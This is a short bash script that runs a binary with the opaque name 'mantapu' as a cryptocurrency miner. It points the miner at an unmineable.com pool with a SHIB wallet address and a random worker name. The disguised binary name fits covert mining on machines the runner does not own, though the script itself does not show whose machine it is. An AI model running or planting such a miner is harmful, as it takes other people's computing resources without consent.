
#!/bin/bash
POOL=rx-us.unmineable.com:3333
WALLET=SHIB:0xae4fa9f4582afc88f329b862738c8c50e5268fba
WORKER=$(echo $(shuf -i 1-99999 -n 1)-xroc)
chmod +x mantapu
./mantapu --algo wrkzcoin --pool $POOL --user $WALLET.$WORKER
